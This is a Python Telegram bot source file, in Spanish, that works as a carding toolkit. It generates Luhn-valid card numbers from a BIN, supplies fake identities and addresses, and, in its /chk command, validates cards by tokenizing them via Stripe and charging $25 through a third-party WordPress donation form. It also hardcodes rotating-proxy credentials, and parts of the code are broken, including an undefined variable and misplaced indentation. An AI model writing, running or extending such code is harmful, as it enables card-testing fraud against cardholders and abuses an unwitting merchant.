import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re

from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from bs4 import BeautifulSoup as bs



# Configure vars get from env or config.yml
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# Initialize bot and dispatcher
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)

# Configure logging
logging.basicConfig(level=logging.INFO)

# BOT INFO
loop = asyncio.get_event_loop()

bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id

# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
proxies = {
           'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
           'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
}

session = requests.Session()

# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for _ in range(6))
Last = ''.join(random.choice(letters) for _ in range(6))
PWD = ''.join(random.choice(letters) for _ in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


def gen(first_6: int, mm: int=None, yy: int=None, cvv: int=None):
    BIN = 15-len(str(first_6))
    card_no = [int(i) for i in str(first_6)]  # To find the checksum digit on
    card_num = [int(i) for i in str(first_6)]  # Actual account number
    seventh_15 = random.sample(range(BIN), BIN)  # Acc no (9 digits)
    for i in seventh_15:
        card_no.append(i)
        card_num.append(i)
    for t in range(0, 15, 2): 
        # odd position digits
        card_no[t] = card_no[t] * 2
    for i in range(len(card_no)):
        if card_no[i] > 9:  # deduct 9 from numbers greater than 9
            card_no[i] -= 9
    s = sum(card_no)
    mod = s % 10
    check_sum = 0 if mod == 0 else (10 - mod)
    card_num.append(check_sum)
    card_num = [str(i) for i in card_num]
    cc = ''.join(card_num)
    if mm is None:
        mm = random.randint(1, 12)
    mm = f'0{mm}' if len(str(mm)) < 2 else mm
    yy = random.randint(2023, 2028) if yy is None else yy
    if cvv is None:
        cvv = random.randint(000, 999)
    cvv = 999 if len(str(cvv)) <= 2 else cvv
    return f'{cc}|{mm}|{yy}|{cvv}'


async def is_owner(user_id):
    return user_id == OWNER

#URL de tu código PHP alojado en Heroku o en otro servidor
php_url = 'https://randomaddress-9d94ddea293c.herokuapp.com/'


async def get_data_from_php():
    try:
        response = requests.get(php_url)
        if response.status_code == 200:
            return response.json()  # Convertir la respuesta JSON a un diccionario
        else:
            return None
    except Exception as e:
        return None

# Llamada a la función desde tu bot de Telegram (ejemplo)
@dp.message_handler(commands=['adr'])
async def handle_adr(message: types.Message):
    await message.answer_chat_action('typing')
    
    data = await get_data_from_php()
    
    if data:
        formatted_data = f'''
🌍 <b>Datos de Dirección Generada:</b>
👤 <i>Nombre:</i> {data['first']} {data['last']}
🏠 <i>Dirección:</i> {data['street']}
🏙️ <i>Ciudad:</i> {data['city']}
🌆 <i>Estado:</i> {data['state']}
📮 <i>Código Postal:</i> {data['zip']}
📞 <i>Teléfono:</i> {data['phone']}
'''
    else:
        formatted_data = "❌ No se pudieron obtener los datos del código PHP."
    
    await message.reply(formatted_data, parse_mode=types.ParseMode.HTML)


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    # await message.answer_chat_action('typing')
    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
    btns = types.InlineKeyboardButton("👉 Bot Source", url="https://github.com/nachotorres1123/Mrbannker")
    keyboard_markup.row(btns)
    FIRST = message.from_user.first_name
    MSG = f'''
👋 ¡Hola, {FIRST}, Soy {BOT_NAME}.
Puedes encontrar a mi creador <a href="tg://user?id={OWNER}">AQUÍ</a>.
Aquí tienes una lista de comandos que puedes usar:
📋 /info - Muestra información sobre el usuario 
🔐 /genf - Genera 1 una tarjeta de crédito
🔐 /gen - Genera 15 tarjetas de crédito
🔍 /bin - Obtiene información sobre un BIN
💳 /chk - Verifica una tarjeta de crédito 
🌏 /adr - Otener Nombre y dirección aleatoria 🔀 
Cmds /info /chk /gen /bin /genf /adr'''
    await message.answer(MSG, reply_markup=keyboard_markup, disable_web_page_preview=True)


@dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name

    user_info = f'''
📋 <b>INFORMACIÓN DEL USUARIO</b> 📋

🆔 <b>ID DE USUARIO:</b> <code>{user_id}</code>
📛 <b>NOMBRE DE USUARIO:</b> @{username}
👤 <b>NOMBRE:</b> {first}
🤖 <b>ES UN BOT:</b> {'✅ Sí' if is_bot else '❌ No'}
👑 <b>PROPIETARIO DEL BOT:</b> {'✅ Sí' if await is_owner(user_id) else '❌ No'}
'''

    user_status = f'''
═════════════════════════════════════

📊 <b>ESTADO DE USUARIO</b> 📊

📮 <b>TIPO DE CHAT:</b> {message.chat.type}
🌐 <b>IDIOMA DEL CHAT:</b> {message.from_user.language_code if message.from_user.language_code else 'Desconocido'}
🕓 <b>FECHA Y HORA:</b> {message.date.strftime('%Y-%m-%d %H:%M:%S')}

═════════════════════════════════════
'''

    await message.reply(user_info + user_status, parse_mode=types.ParseMode.HTML)



@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    BIN = message.text[len('/bin '):]
    
    if len(BIN) < 6:
        return await message.reply('Por favor, envía un número BIN válido.')
    
    r = requests.get(f'https://bins.ws/search?bins={BIN[:6]}').text
    soup = bs(r, features='html.parser')
    info = f'''
Información sobre el BIN: {BIN}
{k.text[62:]}
REMITENTE: <a href="tg://user?id={ID}">{FIRST}</a>
BOT⇢ @{BOT_USERNAME}
CREADOR⇢ <a href="tg://user?id={OWNER}">AQUÍ</a>
'''
    await message.reply(info)




@dp.message_handler(commands=['genf'], commands_prefix=PREFIX)
async def generate_cards(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    
    if len(message.text) == 0:
        return await message.reply("<b>Formato:</b>\n<code>/genf 549184</code>", parse_mode='HTML')
    
    try:
        x = re.findall(r'\d+', message.text)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        num_of_cards = 5  # Número de tarjetas a generar
        cards_list = [gen(first_6=ccn, mm=mm, yy=yy, cvv=cvv) for _ in range(num_of_cards)]
    except IndexError:
        if len(x) == 0:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar al menos los primeros 6 dígitos del BIN.</b>", parse_mode='HTML')
        elif len(x) == 1:
            num_of_cards = 1  # Número de tarjetas a generar
            cards_list = [gen(first_6=ccn) for _ in range(num_of_cards)]
        elif len(x) == 3:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos, mes y año de expiración.</b>", parse_mode='HTML')
        elif len(mm) == 3:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos y el CVV.</b>", parse_mode='HTML')
        elif len(mm) == 4:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos y el año de expiración.</b>", parse_mode='HTML')
        else:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos y el mes de expiración.</b>", parse_mode='HTML')
    
    await asyncio.sleep(3)
    cards_info = '\n'.join([f'<code>{card}</code>' for card in cards_list])
    DATA = f'''
<b>Generadas {num_of_cards} tarjetas de crédito de {ccn}:</b>
{cards_info}
<b>POR:</b> <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT:</b> @{BOT_USERNAME}
<b>CREADOR:</b> <a href="tg://user?id={OWNER}">AQUÍ</a>
'''
    await message.reply(DATA, parse_mode='HTML')


@dp.message_handler(commands=['gen'], commands_prefix=PREFIX)
async def generate_cards(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    
    if len(message.text) == 0:
        return await message.reply("<b>Formato:</b>\n<code>/gen 549184</code>", parse_mode='HTML')
    
    try:
        x = re.findall(r'\d+', message.text)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        num_of_cards = 5  # Número de tarjetas a generar
        cards_list = [gen(first_6=ccn, mm=mm, yy=yy, cvv=cvv) for _ in range(num_of_cards)]
    except IndexError:
        if len(x) == 0:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar al menos los primeros 6 dígitos del BIN.</b>", parse_mode='HTML')
        elif len(x) == 1:
            num_of_cards = 15  # Número de tarjetas a generar
            cards_list = [gen(first_6=ccn) for _ in range(num_of_cards)]
        elif len(x) == 3:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos, mes y año de expiración.</b>", parse_mode='HTML')
        elif len(mm) == 3:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos y el CVV.</b>", parse_mode='HTML')
        elif len(mm) == 4:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos y el año de expiración.</b>", parse_mode='HTML')
        else:
            return await message.reply("<b>Formato incorrecto. Debes proporcionar los primeros 6 dígitos y el mes de expiración.</b>", parse_mode='HTML')
    
    await asyncio.sleep(3)
    cards_info = '\n'.join([f'<code>{card}</code>' for card in cards_list])
    DATA = f'''
<b>Generadas {num_of_cards} tarjetas de crédito de {ccn}:</b>
{cards_info}
<b>POR:</b> <a href="tg://user?id={ID}">{FIRST}</a>
<b>BOT:</b> @{BOT_USERNAME}
<b>CREADOR:</b> <a href="tg://user?id={OWNER}">AQUÍ</a>
'''
    await message.reply(DATA, parse_mode='HTML')



@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('chk', rate=ANTISPAM)
    except Throttled as t:
        await message.reply(f'<b>Too many requests!</b>\nBlocked For {t.delta} seconds')
        return

    logging.info(f"Received CC check request from user {ID}: {message.text}")
    
    if message.reply_to_message:
        cc = message.reply_to_message.text
    else:
        cc = message.text[len('/chk '):]

    if len(cc) == 0:
        return await message.reply("<b>No Card to chk</b>")
    
    logging.info(f"Checking CC: {cc}")

    x = re.findall(r'\d+', cc)
    if len(x) < 4:
        return await message.reply("<b>Invalid card format.</b>")

    ccn, mm, yy, cvv = x[:4]
    if mm.startswith('2'):
        mm, yy = yy, mm
    if len(mm) >= 3:
        mm, yy, cvv = yy, cvv, mm
    if len(ccn) < 15 or len(ccn) > 16:
        return await message.reply('<b>Failed to parse Card</b>\n'
                                   '<b>Reason: Invalid Format!</b>')

    BIN = ccn[:6]
    if BIN in BLACKLISTED:
        return await message.reply('<b>BLACKLISTED BIN</b>')

    headers = {
        "user-agent": UA,
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded"
    }

    s = session.post('https://m.stripe.com/6', headers=headers)
    r = s.json()
    Guid = r['guid']
    Muid = r['muid']
    Sid = r['sid']

    postdata = {
        "guid": Guid,
        "muid": Muid,
        "sid": Sid,
        "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
        "card[name]": Name,
        "card[number]": ccn,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvv
    }

    HEADER = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": UA,
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "accept-language": "en-US,en;q=0.9"
    }

    pr = session.post('https://api.stripe.com/v1/tokens',
                      data=postdata, headers=HEADER)
    Id = pr.json().get('id')

    if not Id:
        return await message.reply("Failed to get token ID from Stripe.")

    load = {
        "action": "wp_full_stripe_payment_charge",
        "formName": "BanquetPayment",
        "fullstripe_name": Name,
        "fullstripe_email": Email,
        "fullstripe_custom_amount": "25.0",
        "fullstripe_amount_index": 0,
        "stripeToken": Id
    }

    header = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": UA,
        "origin": "https://archiro.org",
        "referer": "https://archiro.org/banquet/",
        "accept-language": "en-US,en;q=0.9"
    }

    rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
                      data=load, headers=header)
    msg = rx.json().get('msg')

    toc = time.perf_counter()

    if 'true' in rx.text:
        await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CHARGED 25$
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''', parse_mode='HTML')
    # ... (código para otros casos)

# ... (resto del código)
        if 'security code' in rx.text:
            return await message.reply(f'''
✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #CCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        if 'false' in rx.text:
            return await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ #Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')

        await message.reply(f'''
❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
<b>STATUS</b>➟ DEAD
<b>MSG</b>➟ {rx.text}
<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
<b>OWNER</b>: {await is_owner(ID)}
<b>BOT</b>: @{BOT_USERNAME}''')


@dp.message_handler(commands=['add'], commands_prefix=PREFIX)
async def add_php_data(message: types.Message):
    await message.answer_chat_action('typing')
    
    # URL de la página web para obtener datos
    url = 'https://fakepersongenerator.com/Index/generate'
    
    try:
        response = requests.get(url, headers={
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; vivo 1806) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.64 Mobile Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
        })
        if response.status_code == 200:
            soup = bs(response.content, 'html.parser')
            
            # Obtener nombre completo
            name = soup.find('b', class_='click').text
            first = name.split(' ')[0]
            last = name.split(' ')[-1]
            
            # Obtener dirección
            street = soup.find('p', string=re.compile(r'Street:')).find_next('b').text
            stct = soup.find('p', string=re.compile(r'City, State, Zip:')).find_next('b').text
            city = stct.split(',')[0].strip()
            statefull = stct.split(',')[1].strip()
            state = statefull[statefull.index('(') + 1:statefull.index(')')]
            zip_code = stct.split(',')[2].strip()
            
            # Respuesta con los datos obtenidos
            response_text = f'''
Nombre: {first} {last}
Calle: {street}
Ciudad: {city}
Estado: {state}
Código Postal: {zip_code}
'''
            await message.reply(response_text)
        else:
            await message.reply("No se pudo acceder a la página.")
    except Exception as e:
        await message.reply("Ocurrió un error al obtener los datos.")

# ... (resto del código)

# Bucle principal
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    executor.start_polling(dp, skip_updates=True, loop=loop)
